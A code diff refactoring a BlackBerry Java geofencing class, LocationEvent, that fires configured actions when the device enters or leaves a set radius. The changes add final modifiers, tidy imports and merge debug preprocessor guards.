@@ -15,18 +15,15 @@ import javax.microedition.location.Coordinates;
 import javax.microedition.location.Criteria;
 import javax.microedition.location.Location;
 import javax.microedition.location.LocationException;
-import javax.microedition.location.LocationListener;
 import javax.microedition.location.LocationProvider;
-import javax.microedition.location.ProximityListener;
 import javax.microedition.location.QualifiedCoordinates;
 
+import net.rim.device.api.util.DataBuffer;
 import blackberry.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.location.LocationHelper;
 import blackberry.location.LocationObserver;
-
-import net.rim.device.api.util.DataBuffer;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -63,7 +60,7 @@ public final class LocationEvent extends Event implements LocationObserver {
     }
 
     protected void actualStart() {
-        Criteria criteria = new Criteria();
+        final Criteria criteria = new Criteria();
         criteria.setCostAllowed(true);
 
         criteria.setHorizontalAccuracy(50);
@@ -73,21 +70,21 @@ public final class LocationEvent extends Event implements LocationObserver {
         try {
             lp = LocationProvider.getInstance(criteria);
 
-        } catch (LocationException e) {
-            //#ifdef DEBUG_ERROR
+        } catch (final LocationException e) {
+            //#ifdef DEBUG
             debug.error(e);
             //#endif
         }
 
         if (lp == null) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error("GPS Not Supported on Device");
             //#endif               
             setPeriod(NEVER);
             return;
         }
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("setLocationListener");
         //#endif
         //lp.setLocationListener(this, interval, Conf.GPS_TIMEOUT, Conf.GPS_MAXAGE);
@@ -97,7 +94,7 @@ public final class LocationEvent extends Event implements LocationObserver {
 
     protected void actualStop() {
         if (lp != null) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("actualStop: resetting");
             //#endif
             //lp.setLocationListener(null, -1, -1, -1 );
@@ -112,18 +109,18 @@ public final class LocationEvent extends Event implements LocationObserver {
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
     protected void actualRun() {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("actualRun");
         //#endif
         if (lp == null) {
-            //#ifdef DEBUG_ERROR
+            //#ifdef DEBUG
             debug.error("GPS Not Supported on Device");
             //#endif               
             return;
         }
 
         if (waitingForPoint) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("waitingForPoint");
             //#endif
             return;
@@ -133,13 +130,13 @@ public final class LocationEvent extends Event implements LocationObserver {
             LocationHelper.getInstance().locationGPS(lp, this, false);
         }
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("exiting actualRun");
         //#endif
     }
 
     public void newLocation(Location loc) {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("checkProximity: " + loc);
         //#endif
 
@@ -149,8 +146,8 @@ public final class LocationEvent extends Event implements LocationObserver {
             coordinatesOrig = new Coordinates(latitudeOrig, longitudeOrig,
                     coord.getAltitude());
 
-        } catch (Exception ex) {
-            //#ifdef DEBUG_ERROR
+        } catch (final Exception ex) {
+            //#ifdef DEBUG
             debug.error("QualifiedCoordinates: " + ex);
             //#endif
             return;
@@ -158,37 +155,37 @@ public final class LocationEvent extends Event implements LocationObserver {
         }
 
         try {
-            double actualDistance = coord.distance(coordinatesOrig);
-            //#ifdef DEBUG_INFO
+            final double actualDistance = coord.distance(coordinatesOrig);
+            //#ifdef DEBUG
             debug.info("Distance: " + actualDistance);
             //#endif
             if (actualDistance < distance) {
                 if (!entered) {
-                    //#ifdef DEBUG_INFO
+                    //#ifdef DEBUG
                     debug.info("Enter");
                     //#endif
                     trigger(actionOnEnter);
                     entered = true;
                 } else {
-                    //#ifdef DEBUG_TRACE
+                    //#ifdef DEBUG
                     debug.trace("Already entered");
                     //#endif
                 }
             } else {
                 if (entered) {
-                    //#ifdef DEBUG_INFO
+                    //#ifdef DEBUG
                     debug.info("Exit");
                     //#endif
                     trigger(actionOnExit);
                     entered = false;
                 } else {
-                    //#ifdef DEBUG_TRACE
+                    //#ifdef DEBUG
                     debug.trace("Already exited");
                     //#endif
                 }
             }
-        } catch (Exception ex) {
-            //#ifdef DEBUG_ERROR
+        } catch (final Exception ex) {
+            //#ifdef DEBUG
             debug.error("Distance: " + ex);
             //#endif
             return;
@@ -204,7 +201,7 @@ public final class LocationEvent extends Event implements LocationObserver {
                 confParams.length, false);
 
         if (!Conf.GPS_ENABLED) {
-            //#ifdef DEBUG_WARN
+            //#ifdef DEBUG
             debug.warn("GPS disabled by compilation");
             //#endif
             return true;
@@ -220,7 +217,7 @@ public final class LocationEvent extends Event implements LocationObserver {
                 coordinatesOrig = new Coordinates(latitudeOrig, longitudeOrig,
                         0);
 
-                //#ifdef DEBUG_INFO
+                //#ifdef DEBUG
                 debug.info("Lat: " + latitudeOrig + " Lon: " + longitudeOrig
                         + " Dist: " + distance);
                 //#endif
@@ -231,7 +228,7 @@ public final class LocationEvent extends Event implements LocationObserver {
 
             } catch (final EOFException e) {
                 return false;
-            } catch (IOException e) {
+            } catch (final IOException e) {
                 return false;
             }
             return true;
@@ -243,7 +240,7 @@ public final class LocationEvent extends Event implements LocationObserver {
     }
 
     public void errorLocation() {
-        //#ifdef DEBUG_ERROR
+        //#ifdef DEBUG
         debug.error("errorLocation");
         //#endif
     }
